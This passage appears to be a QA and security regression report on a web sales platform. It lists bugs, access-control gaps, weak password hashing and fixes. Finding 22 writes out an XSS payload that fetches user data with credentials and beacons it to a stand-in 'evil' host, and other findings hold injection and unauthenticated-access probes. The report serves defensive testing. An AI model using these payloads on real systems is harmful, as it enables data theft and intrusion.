| Jobs → row click → Job Detail → score breakdown visible | ✅ |
| Jobs → checkbox click | ❌ navigates instead of selecting (Finding 3) |
| Review Queue → Skip → advances 1 of 20 → 2 of 20 | ✅ |
| Companies → row click → Company Detail → Key People table (1Password: 11 contacts) | ✅ |
| Admin → Monitoring → scan stats, breakdowns, auto-refresh | ✅ |
| Admin → Role Clusters → list 3 clusters | ✅ |
| Admin → Users → **403 hidden behind empty state** | ❌ (Finding 5) |
| Logout → back to /login | ✅ (via Sign Out click) |
| Login as reviewer | ❌ 401 (Finding 1) |
| Login as viewer | ❌ 401 (Finding 1) |

---

## 7. Role-Based Access Control (partial — credentials blocker)

### 7.1 Admin (test-admin)
- Sees `Admin` sidebar group (Monitoring, Role Clusters, Settings).
- Does NOT see `User Management` in sidebar (correctly gated to super_admin in code).
- Direct navigation to `/users` is still possible and renders a misleading empty state instead of a 403 error page.

### 7.2 Reviewer / Viewer
- Could NOT be tested because the provided credentials (`TestReview123`, `TestView123`) return 401. Needs either:
  1. Verified/resent passwords for the test accounts, or
  2. Admin-triggered password reset to a known value.

### 7.3 Code-level observations
- `Sidebar.tsx:104` gates Admin nav to `admin | super_admin`. OK.
- `Sidebar.tsx:128` gates User Mgmt nav to `super_admin`. OK.
- `App.tsx` routes are all `ProtectedRoute`-wrapped but with no per-role check, so direct URL access to admin pages relies entirely on the backend to reject requests. Pages (e.g. `/users`, `/role-clusters`) should also render permission-denied UI when the API 403s.

---

## 8. Misc Observations
- `reventlabs` text badge in top-left reads as lowercase next to the Sales Platform heading — intentional?
- Backend uptime was `26m` at start of testing — platform was restarted recently.
- Dashboard AI Insights says "Platform has 47,072 jobs indexed across **6 ATS sources**" but Platforms page lists jobs on **10 sources** (greenhouse, lever, ashby, workable, himalayas, smartrecruiters, weworkremotely, remoteok, remotive, linkedin). Minor copy inaccuracy.
- Rate limiting on `/api/v1/auth/login` flipped to `503` after ~5 rapid attempts; returned to normal after ~10s. Confirmed again with fresh attempt.

---

## 9. Areas NOT Exercised (recommend adding to next round)
- Resume upload + scoring (requires a real PDF; avoided prod-side effects).
- AI resume customization (Anthropic-backed; costs tokens).
- Password change flow.
- Accept / Reject in Review Queue (state-mutating on real tickets).
- Pipeline drag-drop between stages.
- Company Enrichment trigger (long-running Celery job).
- Full-platform Scan + Discovery triggers (heavy background work).
- Google SSO login for `sarthak.gupta@reventlabs.com`.
- Frontend responsive behaviour below 1024px.
- Screen-reader / keyboard-nav accessibility.
- CSRF / cookie flags (`HttpOnly`, `Secure`, `SameSite`).

---

## 10. Bug Tickets Suggested (one-liner each)
1. Reviewer/Viewer test credentials on the credential sheet don't match the DB — block for QA.
2. Dashboard Companies count (5,827) disagrees with Monitoring/Companies page (6,638).
3. Jobs bulk-select: checkbox click opens detail. Add `stopPropagation` on `<td>` containing the checkbox.
4. Jobs search by company name returns 0 for real companies (`Bitwarden`). Align title+company search.
5. `/users` page for non-super_admin: show permission-denied state instead of `0 / 0 / 0` empty counts.
6. Analytics Job Trends chart: axis labels show `NaN/NaN`.
7. Platforms: `himalayas` 180 errors; bamboohr/jobvite/recruitee/wellfound report 0 jobs despite being active.
8. Sidebar: move `Settings` out of `adminNavigation` so reviewers/viewers can see their own Settings entry.
9. Dashboard Security column: `1864 jobs` badge wraps on 2 lines.
10. Pipeline: "1name" test card in Researching.
11. Feedback: dedup 8+ identical Resume Score / Relevance tickets.
12. Dashboard AI Insight: "6 ATS sources" should be "10" based on Platforms data.

---

## 11. Round 2 Findings (2026-04-15, same-day deep retest)

Added after the fixer landed `212830a` (findings 2–6, 8–9, 11–12) and `6205733`
(finding 1 seed script). Probes run from an authenticated `test-admin` session.
All side-effects were reverted (bad pipeline stage, test uploads deleted, probe
role-cluster deleted).

### 13. Pipeline stage PATCH accepts arbitrary strings
**Severity:** 🟠 HIGH · **Area:** `PATCH /api/v1/pipeline/{client_id}` (`backend/app/api/v1/pipeline.py:347`)

Reproduced:
```js
fetch('/api/v1/pipeline/73617d28-a631-46d5-bc45-934c9b135cfc', {
  method: 'PATCH', credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({stage: 'TOTALLY_FAKE_STAGE_XYZ_REGRESSION'})
})
// → 200 OK; card.stage == "TOTALLY_FAKE_STAGE_XYZ_REGRESSION"
```

Expected: **400 Bad Request** with `"Invalid stage. Must be one of: new_lead, researching, qualified, outreach, engaged, disqualified"` — exactly what `POST /api/v1/pipeline` already does via `_get_stage_keys(db)` at `pipeline.py:310-312`.

**Fix:** mirror the same check inside `update_client` — before assigning `client.stage = body.stage`, verify `body.stage in await _get_stage_keys(db)`; else raise `HTTPException(400, …)`.

The probe card was PATCHed back to `researching` immediately after testing.

---

### 14. Resume upload does not validate file content
**Severity:** 🟡 MEDIUM · **Area:** `POST /api/v1/resume/upload`

1. Plain-text body with `.pdf` extension and fake `application/pdf` MIME:
   ```js
   const fd = new FormData();
   fd.append('file', new Blob(['just plain text'], {type: 'application/pdf'}), 'spoofed.pdf');
   fetch('/api/v1/resume/upload', {method: 'POST', body: fd, credentials: 'include'})
   // → 200 OK; resume persisted: word_count: 0, status: "error", is_active: false
   ```

2. Empty 0-byte file (`new Blob([''], {type: 'application/pdf'})`) — same 200 OK, persisted.

3. ✅ Oversized (6 MB padded `%PDF` header): correctly rejected with 400 "File size exceeds 5MB limit".

Both garbage records were deleted via `DELETE /api/v1/resume/{id}` → 200 OK.

**Impact:** pollutes `resume` table with unusable entries that still appear in the user's resume list UI. User has to manually delete or IT has to clean.

**Fix:** after saving, attempt `PyPDF2.PdfReader(io.BytesIO(raw))` / `docx.Document(io.BytesIO(raw))`; if it throws, return 400 before commit. Also reject 0-byte files at the boundary (`UploadFile.size == 0`).

---

### 15. Pipeline PATCH has no bounds on priority or notes
**Severity:** 🟡 MEDIUM · **Area:** `PATCH /api/v1/pipeline/{client_id}` (`PipelineUpdate` schema)

```
PATCH {priority: 999999999}     → 200, stored
PATCH {priority: -100}          → 200, stored
PATCH {notes: 'x'.repeat(102400)} → 200, 100 KB stored verbatim
```

Both fields were reset after probing.

XSS probe: `{notes: '<img src=x onerror="window.__PWNED=true">'}` was stored as-is; after navigating to `/pipeline` the script **did not execute** (React escapes text children by default), but the raw string appeared as visible text on the card. Today this is not exploitable — but the unbounded field + stored HTML becomes a persistent-XSS vector the moment anything downstream uses `dangerouslySetInnerHTML` on notes.

**Fix:** on `schemas/pipeline.py`, add `priority: int = Field(default=0, ge=0, le=100)` and `notes: str = Field(default='', max_length=4000)`.

---

### 16. Feedback GET returns 500 for non-UUID path
**Severity:** 🟠 HIGH (a 500 is a server-error breadcrumb — should be a 4xx) · **Area:** `GET /api/v1/feedback/{feedback_id}` (`backend/app/api/v1/feedback.py:274`)

```
GET /api/v1/feedback/not-a-uuid   → 500 Internal Server Error   ❌
GET /api/v1/jobs/not-a-uuid        → 422 Unprocessable Entity   ✅
GET /api/v1/companies/not-a-uuid   → 422 Unprocessable Entity   ✅
```

Root cause: `feedback_id: str` at `feedback.py:276` (also 292, 115, 162). `db.get(Feedback, "not-a-uuid")` bubbles a Postgres cast error up as a 500.

**Fix:** change the path-param annotations to `feedback_id: UUID` and import `from uuid import UUID`. Pydantic will then auto-422 for malformed UUIDs.

---

### 17. Himalayas fetcher hard-caps at 1020 jobs per scan
**Severity:** 🟡 MEDIUM · **Area:** `backend/app/fetchers/himalayas.py:62-63`

```python
# Safety limit — fetch up to 1000 jobs per scan
if offset > 1000:
    break
```

Last 3 scans (`GET /api/v1/platforms/scan-logs?platform=himalayas&limit=3`):
```
jobs_found: 1020, new_jobs: 931, duration_ms: 30660
jobs_found: 1020, new_jobs: 617, duration_ms: 20568
jobs_found: 1020, new_jobs: 933, duration_ms: 22647
```

Identical `jobs_found` with fluctuating `new_jobs` implies the Himalayas catalog is >1020 and each scan grabs a slightly different subset of the head. This is the structural driver behind part of **Finding #7** (himalayas 180 accumulated errors) — we likely keep re-inserting/updating the same ~1020 rows while the tail is never seen.

**Fix options:**
1. Lift the cap (e.g. to 5000) if latency stays acceptable — simplest.
2. Switch to incremental pagination: persist the highest `pubDate` we saw, only fetch newer-than that next scan.
3. Keep the cap, but rotate the `offset` seed per run so we cycle through the catalog.

---

### 18. `/jobs?search=Stripe` returns 3 but Stripe has 61 jobs
**Severity:** 🟡 MEDIUM · **Area:** search routing / deployment integrity

```
GET /api/v1/companies?search=stripe
  → {total: 1, items: [{name: "Stripe", job_count: 61}]}
GET /api/v1/jobs?company_id=89619c2c-46d4-470e-a696-0292e4936ec1
  → {total: 61}     ✅ direct company filter works
GET /api/v1/jobs?search=Stripe
  → {total: 3}      ❌ only title matches come through
GET /api/v1/jobs?search=Stripe&status=all
  → {total: 0}      ❌ default-status override breaks results entirely
```

Commit `212830a` added `Job.company.has(Company.name.ilike(...))` at `jobs.py:76`, which should return all 61. Either:
- The backend container hasn't been rebuilt / redeployed yet (fix is in git, not on the running process).
- `joinedload(Job.company)` is fine, but the EXISTS subquery behind `has()` might hit a different Company row than expected (e.g. jobs whose `company_id` points to a company named "Stripe, Inc." vs "Stripe").

**Next step:** hit `/api/v1/monitoring/health` (or similar) to confirm the deployed commit SHA; if it still shows `b2cb1d4` / pre-fix, trigger a redeploy first. If it already says `212830a`, add a server-side log of the generated SQL to see why the `has()` branch returns 0.

Also: the `status=all` permutation going to **0** (not 3) is suspicious — looks like `status=all` is treated as a literal enum value by the handler rather than as "no filter". Worth a separate look at `jobs.py:56-57`.

---

### 19. Missing defensive response security headers
**Severity:** 🔵 LOW · **Area:** HTTP response headers (origin + Cloudflare edge)

`curl -sI https://salesplatform.reventlabs.com/api/v1/auth/me`:
```
✅ x-content-type-options: nosniff
✅ x-frame-options: SAMEORIGIN
✅ x-xss-protection: 1; mode=block
✅ referrer-policy: strict-origin-when-cross-origin
❌ Content-Security-Policy                       (missing)
❌ Strict-Transport-Security                     (missing)
❌ Permissions-Policy                            (missing)
❌ Cross-Origin-{Opener,Embedder,Resource}-Policy (missing)
```

Login-cookie flags (from `POST /api/v1/auth/login`):
`Set-Cookie: session=…; HttpOnly; Max-Age=86400; Path=/; SameSite=lax; Secure` ✅

The JWT is also echoed in the JSON body (not just the cookie), but `Object.keys(localStorage)` is `[]` after login — so the frontend does not persist it anywhere JS-reachable. Fine.

**Fix (cheap):** add HSTS + a starter CSP at the Cloudflare edge (Rules → Transform Rules → HTTP Response Header Modification). Start CSP in `Content-Security-Policy-Report-Only` mode so we don't break the existing bundle.

---

### 20. Role-cluster `name` accepts arbitrary characters
**Severity:** 🔵 LOW · **Area:** `POST /api/v1/role-clusters`

Probe:
```
POST /api/v1/role-clusters
{ "name": "test'); DROP TABLE role_cluster_config;--",
  "display_name": "x", "keywords": "test", "approved_roles": "" }
→ 200 OK; name stored as "test');_drop_table_role_cluster_config;--"
```

Not SQLi (SQLAlchemy params are safe). But `name` is used as a URL query value (e.g. `/jobs?role_cluster=<name>`) and as a key in UI state — punctuation, whitespace, or quotes silently surviving normalization will bite us later.

**Fix:** in `schemas/role_config.py`, restrict `name` via `Field(..., pattern=r'^[a-z0-9][a-z0-9_-]{1,30}$')` so the cluster key stays URL-safe.

Test cluster was deleted via `DELETE /api/v1/role-clusters/<id>` → 200 OK.

---

## 12. Observations from the retest (no finding, FYI)

- **RBAC sanity:** as `admin`, `/users` and `/auth/register` correctly return 403; `/role-clusters` POST correctly allowed. OK.
- **UUID handling:** `/jobs/not-a-uuid` → 422, `/companies/not-a-uuid` → 422, `/pipeline/{non-uuid}/stage` → 404. Consistent except feedback (Finding 16).
- **Pagination bounds:** `page=0` → 422, `page=999999999` → 200 with empty items + correct `total_pages`, `page_size=-1` → 422, `page_size=9999` → 422 (clamped at 200). Sensible.
- **Silent sort fallback:** `sort_by=malicious_column` → 200 with default sort (first_seen_at). Safe but no error signal — consider 422 for unknown sort columns.
- **Finding #10 retest:** the "1name" card still exists at id `73617d28-a631-46d5-bc45-934c9b135cfc` with `total_open_roles: 123, accepted_jobs_count: 1, stage: researching`. Awaiting the data-cleanup task the fixer flagged.

---

## 13. Round 3 Findings (2026-04-15, post-deploy retest + new probes)

Context: after the fixer announced "Changes deployed on prod" (commit `212830a`
plus `6205733`), the tester re-verified Round-1 fixes and continued with deeper
probes. All Round-1 fixes pass re-test. All side-effects from new probes were
reverted (probe feedback tickets resolved with `[regression test cleanup]` note,
attachments deleted, status PATCHes restored to original).

### Round-1 fix retest (all ✅ on prod)

| # | Probe | Prod result | Verdict |
|---|---|---|---|
| 2 | `GET /analytics/overview` vs `GET /companies?per_page=1` | both return `6638` | ✅ fixed |
| 4 | `GET /jobs?search=Bitwarden` → 17 items · `search=Stripe` → 61 items (matches `companies.job_count`) | fixed | ✅ fixed (supersedes Finding #18) |
| 6 | `GET /analytics/trends?days=7` returns both `day/total` AND aliased `date/new_jobs/count` keys | no NaN | ✅ fixed |
| 11 | Duplicate POST with same title within 7d → `409` + `existing_feedback_id` | correct | ✅ fixed |
| 12 | AI-insight now says "10 ATS sources" (was "6") | improved — **but still mismatches `/platforms` which shows 14**; tracked as new Finding #28 | 🟡 partial |

---

### 21. Unauthenticated file access via feedback attachment endpoint
**Severity:** 🔴 BLOCKER · **Area:** `backend/app/api/v1/feedback.py:193-201`

```python
@router.get("/attachments/{filename}")
async def get_attachment(filename: str):      # ← NO Depends(get_current_user)
    safe_name = Path(filename).name
    file_path = UPLOAD_DIR / safe_name
    if not file_path.exists():
        raise HTTPException(404, "File not found")
    return FileResponse(file_path)
```

Reproduced on prod:
1. Admin creates a feedback ticket + uploads `probe.png` → stored filename `3ae9b021c4c841738b74deecff3d6f2f.png`.
2. `curl …/api/v1/feedback/attachments/3ae9b021c4c841738b74deecff3d6f2f.png` **without any cookie** → `HTTP 200, 70 bytes` (file served).
3. Viewer user (`test-viewer@`) downloads same file → `HTTP 200, 70 bytes` (byte-identical).
4. `diff` against the admin download: **IDENTICAL**.

Directory traversal is correctly blocked (`Path(filename).name` strips dirs — `../../etc/passwd` → 404).

**Impact:** users attach screenshots / PDFs of internal screens, resumes, or bug context to tickets thinking it's private. The 32-char hex filenames are hard to guess, but are logged in nginx access logs, leak via Referer headers if anyone clicks a link out, appear in the feedback JSON (exposed to anyone who can list any feedback), etc. A `viewer` role is explicitly allowed to see another user's attachment today.

**Fix:** add `user: User = Depends(get_current_user)` to the signature. Then check that the feedback row referencing this filename belongs to `user.id` (or user is admin/super_admin). Simplest:
```python
async def get_attachment(filename: str, user: User = Depends(get_current_user), db: AsyncSession = Depends(get_db)):
    # Find the feedback that owns this attachment
    result = await db.execute(select(Feedback).where(Feedback.attachments.like(f'%"filename": "{filename}"%')))
    fb = result.scalar_one_or_none()
    if not fb or (fb.user_id != user.id and user.role not in ("admin","super_admin")):
        raise HTTPException(404, "File not found")
    # …serve file…
```

Probe attachment + feedback ticket were deleted after testing.

**✅ Fix applied** (`feedback.py:193-228`): endpoint now declares `user: User = Depends(get_current_user)` and `db: AsyncSession = Depends(get_db)`. Before returning the `FileResponse`, we ILIKE-scan `Feedback.attachments` for the exact `"filename": "<name>"` fragment to find the owning ticket; request is rejected 404 if unlinked, 403 if the caller is neither the ticket author nor admin/super_admin. Directory-traversal hardening (`Path(filename).name`) retained.

---

### 22. Stored DOM-XSS via third-party ATS HTML in JobDetailPage
**Severity:** 🔴 BLOCKER · **Area:** `frontend/src/pages/JobDetailPage.tsx:386-396` + `backend/app/api/v1/jobs.py:276-278`

```tsx
{description.raw_text.includes("<") ? (
  <div
    className="prose prose-sm max-w-none text-gray-700"
    dangerouslySetInnerHTML={{ __html: description.raw_text }}   // ← stored ATS HTML
  />
) : (
  <div className="prose prose-sm max-w-none text-gray-700 whitespace-pre-wrap">
    {description.raw_text}
  </div>
)}
```

`raw_text` comes directly from the ATS response (`raw_json.content` from Greenhouse, `descriptionHtml` from Ashby, etc.). The backend further **HTML-unescapes** it at `jobs.py:276-278`, so any platform that escaped `<` as `&lt;` in its API response has that protection actively *removed* by our code before we inject it into the DOM.

Why this matters:
- An attacker posting a job on any supported ATS can include `<img src=x onerror=fetch('/api/v1/users',{credentials:'include'}).then(r=>r.json()).then(d=>navigator.sendBeacon('//evil/',JSON.stringify(d)))>`.
- Any authenticated user who opens that job detail page runs the attacker's JS on our origin.
- `HttpOnly` cookie blocks `document.cookie` access, but `fetch` with `credentials:'include'` works fine — the attacker can call any authenticated endpoint (list all contacts, patch pipeline, create admin feedback, etc.).
- We confirmed existing prod job descriptions are full of legitimate HTML (`<p>`, `<ul>`, etc.) — so we can't just strip all tags, but we MUST sanitize.

Verified injection path is live: the real first job's `raw_text.len = 14988` and contains `<`, i.e. hits the dangerous branch.

**Fix:** add `dompurify` (~20 KB) and sanitize before setting innerHTML:
```tsx
import DOMPurify from 'dompurify';
…
dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(description.raw_text, {
  ALLOWED_TAGS: ['p','br','ul','ol','li','strong','em','b','i','u','h1','h2','h3','h4','h5','h6','a','code','pre','blockquote'],
  ALLOWED_ATTR: ['href','title'],
  ALLOWED_URI_REGEXP: /^(https?|mailto):/i,
}) }}
```
Also remove the backend `html_mod.unescape` at `jobs.py:276-278` — it's actively making things worse.

**✅ Fix applied** (backend, no frontend dep needed): added `backend/app/utils/sanitize.py` with `sanitize_html()` built on BeautifulSoup (already a dep). Both `raw_text` return paths in `jobs.py` (the stored `JobDescription` branch *and* the `raw_json` fallback that follows `html_mod.unescape`) now pass their text through `sanitize_html()` before returning it to the frontend. The sanitizer:

- **Hard-drops** `<script>`, `<style>`, `<iframe>`, `<embed>`, `<object>`, `<applet>`, `<link>`, `<meta>`, `<form>`, `<input>`, `<button>`, `<svg>`, `<noscript>`, etc. — along with their children.
- **Unwraps** anything not in a conservative allowlist (`<p>`, `<br>`, `<ul>`, `<ol>`, `<li>`, `<a>`, `<strong>`, headings, tables, etc.) — keeps the text, drops the tag.
- **Drops every `on*` attribute** (onclick, onload, onerror, …) and any attribute not in the allowlist.
- **Drops `href` / `src`** whose scheme is not `http:`, `https:`, `mailto:`, `/`, or `#` (i.e. kills `javascript:`, `data:`, `vbscript:`, `file:`).
- **Forces `<a>` tags** to `rel="noopener noreferrer nofollow"` + `target="_blank"`.

Frontend `JobDetailPage.tsx` still uses `dangerouslySetInnerHTML`, but the input is now trusted-safe from the backend. Kept `html_mod.unescape()` — it runs *before* sanitization, so escaped payloads like `&lt;script&gt;` are decoded and then stripped by `sanitize_html()` in the same pass.

---

### 23. Password hashing uses unstretched SHA-256 with a global salt
**Severity:** 🔴 BLOCKER · **Area:** `backend/app/api/v1/auth.py:36-43`

```python
def _hash_password(password: str) -> str:
    """SHA-256 hash with salt from jwt_secret. For production use bcrypt instead."""
    salted = f"{settings.jwt_secret}:{password}"
    return hashlib.sha256(salted.encode()).hexdigest()

def _verify_password(password: str, password_hash: str) -> bool:
    return _hash_password(password) == password_hash
```

Problems (three):
1. **Single-round SHA-256.** Designed to be fast. A 4090 does ~10 Gh/s — 10-char passwords fall in hours.
2. **Global salt** (`jwt_secret`), not per-user. Two users with the same password have identical hashes. Rainbow tables become viable once the secret leaks.
3. **Non-constant-time compare** (`==`). Even at SHA-256 speeds, the timing side-channel is small-but-real — should use `hmac.compare_digest`.

The code itself admits the issue: `"""For production use bcrypt instead."""` — but prod is using this.

**Fix:** migrate to `bcrypt` / `argon2-cffi` with lazy upgrade:
```python
from passlib.hash import bcrypt
def _hash_password(p): return bcrypt.using(rounds=12).hash(p)
def _verify_password(p, h):
    # First try bcrypt; fall back to the legacy SHA-256 and upgrade on next login
    if h.startswith("$2"): return bcrypt.verify(p, h)
    legacy = hashlib.sha256(f"{settings.jwt_secret}:{p}".encode()).hexdigest()
    return hmac.compare_digest(legacy, h)
```
On successful legacy verify, re-hash with bcrypt and update `user.password_hash` in the same transaction. After a migration window, drop the fallback.

---

### 24. No rate limiting / lockout on login endpoint
**Severity:** 🟠 HIGH · **Area:** `backend/app/api/v1/auth.py:60-90`

Probes:
- 25 consecutive wrong-password POSTs in 15s: all accepted (mix of 401s and transient 503s). No 429, no Retry-After, no account-lock flag on the user row.
- Immediately after: valid creds log in fine. No IP-ban, no email alert.
- Under burst, the backend starts returning 503 (queue exhaustion, likely because each login does a DB roundtrip + a password hash on the request thread) — but this is a side effect, not a defence.

Combined with Finding #23 (fast hashing), this makes **online** credential stuffing viable. Even with bcrypt, we'd still want a limiter.

**Fix:** add `slowapi` (FastAPI-friendly wrapper over limits). Typical rule: 10 login attempts per IP per 15 min, 5 failed attempts per email per hour. Either return 429 immediately or inject a 1-5s delay. Also add an `auth_failures` counter on `User` and lock at 10 consecutive fails (unlock after 1h or via admin).

---

### 25. Feedback schema has no max_length on free-text fields
**Severity:** 🟡 MEDIUM · **Area:** `backend/app/schemas/feedback.py`

```python
class FeedbackCreate(BaseModel):
    title: str = Field(..., min_length=5, max_length=200)    # ✅ bounded
    description: str = Field(..., min_length=20)              # ❌ no max
    steps_to_reproduce: str | None = None                     # ❌
    expected_behavior: str | None = None                      # ❌
    actual_behavior: str | None = None                        # ❌
    use_case: str | None = None                               # ❌
    proposed_solution: str | None = None                      # ❌
    impact: str | None = None                                 # ❌
    screenshot_url: str | None = None                         # ❌ also no URL check
```

Verified: `POST /feedback` with `description = 'A' * 1_000_000` → **HTTP 200**, stored. The 1MB ticket was cleaned up.

**Impact:** DB bloat, network bandwidth, UI render jank (a 1MB description in the card preview). `screenshot_url` accepting `javascript:` is a footgun if the field is ever rendered via `<a href>` or inline image.

**Fix:** `description: str = Field(..., min_length=20, max_length=10_000)` (and similar on siblings). For `screenshot_url`, use `pydantic.HttpUrl` or `Field(pattern=r'^https?://…')`.

---

### 26. Intelligence → Timing posting_by_day is massively skewed to Sunday
**Severity:** 🟡 MEDIUM · **Area:** `backend/app/api/v1/intelligence.py` (timing endpoint) + upstream `Job.posted_at`/`first_seen_at`

`GET /api/v1/intelligence/timing` → `posting_by_day`:
```
Sunday    23696  50.3%   ← anomalous
Monday     6496  13.8%
Tuesday    5456  11.6%
Wednesday  4169   8.8%
Thursday   3020   6.4%
Friday     2384   5.1%
Saturday   1921   4.1%
```
Half of all jobs are posted on Sunday? Far more likely that jobs with missing `posted_at` fall back to `first_seen_at`, and the first bulk import / weekly backfill happened on a Sunday, skewing the "day of week" aggregation.

**Fix:** investigate the aggregation SQL. If it's using `EXTRACT(DOW FROM COALESCE(posted_at, first_seen_at))`, switch to `EXTRACT(DOW FROM posted_at)` and filter out `NULL posted_at` explicitly. If the data genuinely has no real `posted_at` for those 23k rows, the "post on Sundays" recommendation this page emits is garbage — hide the card or add a "low data quality" disclaimer.

---

### 27. Intelligence → Networking returns corrupted contact fields
**Severity:** 🟡 MEDIUM · **Area:** `GET /api/v1/intelligence/networking` + upstream contact ingestion

First suggestion returned on prod:
```json
{
  "name": "Gartner PeerInsights",
  "title": "Wade BillingsVP, Technology Services, Instructure",
  "company": "BugCrowd",
  "email": "gartner.peerinsights@bugcrowd.com",
  "is_decision_maker": true,
  "open_roles": 31,
  "top_relevance_score": 98.0
}
```

Multiple signals of broken ingestion:
- `name` is a product name ("Gartner PeerInsights"), not a person.
- `title` has two glued values: `"Wade Billings" + "VP, Technology Services, Instructure"` with no space.
- `company` says `"BugCrowd"` but title mentions `"Instructure"` — contact is probably from Instructure listed against the wrong company.
- `email` was synthesized as `{slugified name}@{company domain}` → `gartner.peerinsights@bugcrowd.com` — plausibly a catch-all but definitely not a real person's inbox.

**Impact:** sales team gets presented with decision-maker outreach suggestions with wrong names, wrong companies, wrong emails. Worst-case we email the wrong person at the wrong company with a personalized note referencing another company. Reputational + deliverability damage.

**Fix:** audit the contact ingestion pipeline — where is `name` vs `title` being split? `email_status: "catch_all"` suggests the synthesizer is aware the email is unverified but still surfacing it as a high-relevance suggestion (98.0). At minimum, filter `email_status == "catch_all"` out of the default suggestions list, and add a sanity check that `name` is two tokens (first/last) without commas/colons.

---

### 28. AI Insight "10 ATS sources" mismatches Platforms page "14"
**Severity:** 🟡 MEDIUM · **Area:** `backend/app/api/v1/analytics.py:130` (`total_sources` computation) vs `/api/v1/platforms`

- `GET /analytics/ai-insights` → insight text: *"Platform has 47,081 jobs indexed across **10** ATS sources."*
- `GET /api/v1/platforms` → 14 distinct platforms: `ashby, bamboohr, greenhouse, himalayas, jobvite, lever, linkedin, recruitee, remoteok, remotive, smartrecruiters, wellfound, weworkremotely, workable`.

Gap of 4: `bamboohr, recruitee, wellfound, weworkremotely` all have boards in the DB but 0 current `jobs` rows (Finding #7 lists three of these as stuck at 0). `COUNT(DISTINCT jobs.platform)` therefore returns 10.

The Finding #12 fix moved the number from `6 → 10` (good), but the user-facing comparison is still off by 4 because two different queries back the two numbers. A platform row with an active board but temporarily 0 jobs is still "a source" from the user's perspective.

**Fix:** change `total_sources` to `COUNT(DISTINCT company_ats_boards.platform WHERE is_active = true)` — i.e. source "what we monitor" rather than "what produced a job row today". This also matches the Platforms page, which the user sees right next to the insight card.

---

### 29. Feedback stats cards omit "Closed" → Total does not reconcile
**Severity:** 🔵 LOW · **Area:** `frontend/src/pages/FeedbackPage.tsx` stats row

At `/feedback` the summary cards show:
```
Total 33   ·   Open 16   ·   In Progress 0   ·   Resolved 12
```
But `GET /feedback/stats.by_status` returns `{open: 16, in_progress: 0, resolved: 12, closed: 5}`. 16+0+12 = 28 ≠ 33. The 5 `closed` tickets exist and are selectable via the status dropdown, but there's no stat card for them — users can't reconcile the Total without opening the filter.

**Fix:** add a fourth card `Closed X` (or combine Resolved+Closed into a single `Done X` card). Cheap win.

---

### 30. "Update Ticket" has no button styling + no success toast
**Severity:** 🔵 LOW · **Area:** ticket-detail modal in `frontend/src/pages/FeedbackPage.tsx`

- "Update Ticket" is rendered as plain black text next to the Status dropdown — no border, no background, no hover state visible. Accessibility tree confirms it is a `<button>`, but visually it reads as a label.
- On click, PATCH goes through and the modal closes, but there is no toast/snack confirming success. New users may click twice, or assume nothing happened.

Functionality is correct (`PATCH /feedback/{id}` → 200, status and notes persist, stats cards update in real time — verified end-to-end on prod with the "Search Bar" ticket, then reverted).

**Fix:** style the button (use the existing `Button variant="primary"` component). Wire up the existing toast system (`sonner` / `react-hot-toast` — whichever ships with the app) on `mutation.onSuccess`.

---

### 31. Legacy duplicate "Resume Score / Relevance" tickets still present
**Severity:** 🟡 MEDIUM · **Area:** data cleanup (not code)

Finding #11 prevents **new** duplicates — but the original 8 identical `Resume Score / Relevance` tickets from `khushi.jain@reventlabs.com` (submitted 4/14, all status=open) are still in the queue. Current open list has the dupes pre-dating the fix and clutters the admin view.

Listed open tickets (2026-04-15, admin filter status=open, total 16):
```
[MEDIUM] 4edaefed · improvement     · Search Bar                          · khushi.jain@
[MEDIUM] e93fabd0 · improvement     · Problem of Filter Stickness         · khushi.jain@
[   LOW] 750b7716 · bug             · Testing                             · aditya.bambal@
[MEDIUM] e0115437 · bug             · Testing                             · aditya.bambal@
[MEDIUM] e46d2820 · bug             · Testing                             · aditya.bambal@
[MEDIUM] 58e6e669 · improvement     · Problem of Filter Stickness         · khushi.jain@   ← dupe of e93fabd0
[MEDIUM] c9f184ad · improvement     · Resume Score / Relevance            · khushi.jain@   ↓ 8 dupes
[MEDIUM] 4ef54eee · improvement     · Resume Score / Relevance            · khushi.jain@
[MEDIUM] a0c81e13 · improvement     · Resume Score / Relevance            · khushi.jain@
[MEDIUM] f660c03c · improvement     · Resume Score / Relevance            · khushi.jain@
[MEDIUM] 4449f64a · improvement     · Resume Score / Relevance            · khushi.jain@
[MEDIUM] 936f130c · improvement     · Resume Score / Relevance            · khushi.jain@
[MEDIUM] 2085b342 · improvement     · Resume Score / Relevance            · khushi.jain@
[MEDIUM] ab888c64 · improvement     · Resume Score / Relevance            · khushi.jain@
[   LOW] 878fd009 · bug             · API test screenshot URL check       · admin@jobplatform.io
[MEDIUM] ce73c529 · improvement     · Search Bar Query                    · khushi.jain@
```

Recommended cleanup (one-off SQL, with admin approval):
```sql
-- Keep the first (oldest) Resume Score ticket from khushi.jain, close the rest
UPDATE feedback SET status='closed', admin_notes=COALESCE(admin_notes,'') || ' [auto-closed as dup of earliest]'
 WHERE user_id = (SELECT id FROM users WHERE email='khushi.jain@reventlabs.com')
   AND title = 'Resume Score / Relevance' AND status = 'open'
   AND id NOT IN (
     SELECT id FROM feedback WHERE user_id=(SELECT id FROM users WHERE email='khushi.jain@reventlabs.com')
      AND title='Resume Score / Relevance' AND status='open' ORDER BY created_at LIMIT 1
   );
-- Same for Problem of Filter Stickness (2 copies)
UPDATE feedback SET status='closed' WHERE id='58e6e669-…';
-- Delete obvious "Testing" tickets from aditya.bambal@
DELETE FROM feedback WHERE user_id=(SELECT id FROM users WHERE email='aditya.bambal@reventlabs.com')
  AND title='Testing' AND status='open';
```

Verify counts after: `/feedback/stats.by_status.open` should drop from 16 → about 6.

---

## 14. Round 4 Findings (2026-04-15, re-retest + UI/UX deep audit)

### 32. Round 3 fixes marked ✅ are not actually live on prod
**Severity:** 🔴 BLOCKER · **Area:** Deploy / Release

While starting a Round 4 UI/UX audit I re-probed each Round 3 finding that the branch marks ✅ fixed. Most of them are still reproducing on prod. The code on `fix/regression-findings` is correct, but that code has not been rolled out — prod is running an image that predates commits `85bfa77` / `ba19e50` / `9bdc572` / `34f57b4` / `32d970f` / `d24d2a9`.

Concrete evidence (all as `test-admin@reventlabs.com` on `https://salesplatform.reventlabs.com`):

| Finding | Expected after fix | Observed on prod |
|---|---|---|
| #16 | `GET /feedback/not-a-uuid` → **422** (structured validation error) | **500 Internal Server Error** |
| #21 | `GET /feedback/attachments/<filename>` without cookie → **401** | **HTTP 200 + raw PNG bytes** (reproduced by uploading `probe21.png` as admin then `curl` with no cookies). The endpoint still has no auth check live |
